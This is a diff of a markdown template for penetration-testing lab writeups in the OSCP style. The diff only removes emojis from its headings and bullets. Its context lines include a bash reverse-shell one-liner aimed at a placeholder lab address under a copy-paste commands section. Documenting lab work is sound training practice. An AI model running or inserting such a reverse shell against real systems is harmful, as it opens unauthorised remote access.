@@ -4,7 +4,7 @@ description: Complete template for documenting machine solutions
 tags: [template, writeup, oscp]
 ---
 
-# 📝 Machine Writeup Template
+#  Machine Writeup Template
 
 > Copy this template for each machine you solve. Fill it out as you work through the machine, not after.
 
@@ -34,7 +34,7 @@ tags: [template, writeup, oscp]
 
 ---
 
-## 🔍 Enumeration
+##  Enumeration
 
 ### Network Reconnaissance
 
@@ -70,7 +70,7 @@ $ [output]
 
 ---
 
-## 🎯 Vulnerability Analysis
+##  Vulnerability Analysis
 
 ### Vulnerability #1: [Name]
 
@@ -90,7 +90,7 @@ Code/output showing the vulnerability
 
 ---
 
-## ⚔️ Exploitation
+##  Exploitation
 
 ### Attack Path Overview
 
@@ -150,7 +150,7 @@ $ [output]
 
 ---
 
-## 🔧 Post-Exploitation
+##  Post-Exploitation
 
 ### Information Gathering on Compromised System
 
@@ -199,7 +199,7 @@ FLAG{...}
 
 ---
 
-## 📊 Timeline
+##  Timeline
 
 | Time | Action | Result |
 |------|--------|--------|
@@ -212,29 +212,29 @@ FLAG{...}
 
 ---
 
-## 🎓 Lessons Learned
+##  Lessons Learned
 
 ### What Worked Well
 
-✅ **Technique 1:** Why this was effective
-✅ **Technique 2:** Why this saved time
-✅ **Methodology:** What part of your process was strong
+ **Technique 1:** Why this was effective
+ **Technique 2:** Why this saved time
+ **Methodology:** What part of your process was strong
 
 ### What Didn't Work
 
-❌ **Attempted technique:** Why it failed
-❌ **Time wasted:** What you should have done differently
+ **Attempted technique:** Why it failed
+ **Time wasted:** What you should have done differently
 
 ### Key Insights
 
-💡 **Insight 1:** Connection between [technique A] and [technique B]
-💡 **Insight 2:** Important detail you almost missed
-💡 **Insight 3:** Pattern to watch for in future machines
+ **Insight 1:** Connection between [technique A] and [technique B]
+ **Insight 2:** Important detail you almost missed
+ **Insight 3:** Pattern to watch for in future machines
 
 ### Techniques to Practice More
 
-🔄 **[[Exploitation/Web/Server-Side-Template-Injection|SSTI]]** — Didn't encounter but should know better
-🔄 **[[Exploitation/Linux/Container-Escape|Container Escape]]** — Saw references, need to study
+ **[[Exploitation/Web/Server-Side-Template-Injection|SSTI]]** — Didn't encounter but should know better
+ **[[Exploitation/Linux/Container-Escape|Container Escape]]** — Saw references, need to study
 
 ### Related Machines to Solve
 
@@ -243,7 +243,7 @@ FLAG{...}
 
 ---
 
-## 📚 Resources Used
+##  Resources Used
 
 - **Tools:** [[Tools-Reference/Web-Fuzzing|ffuf]], [[Tools-Reference/Exploitation-Frameworks|Metasploit]]
 - **Techniques:** [[Enumeration/Web-Enumeration|Web enumeration]], [[Exploitation/Web/SQL-Injection|SQL injection]]
@@ -251,7 +251,7 @@ FLAG{...}
 
 ---
 
-## 📝 Commands Reference
+##  Commands Reference
 
 ### Quick Copy-Paste Oneliners
 
@@ -265,7 +265,7 @@ bash -i >& /dev/tcp/10.10.14.XXX/4444 0>&1
 
 ---
 
-## 🔐 Security Notes
+##  Security Notes
 
 - **Credentials Discovered:**
   - Username: [user]
@@ -274,7 +274,7 @@ bash -i >& /dev/tcp/10.10.14.XXX/4444 0>&1
 - **Sensitive Files Found:**
   - [File path] — [brief description]
 
-> ⚠️ Remember: In writeups for public sharing, redact or replace real credentials and sensitive paths.
+>  Remember: In writeups for public sharing, redact or replace real credentials and sensitive paths.
 
 ---
 
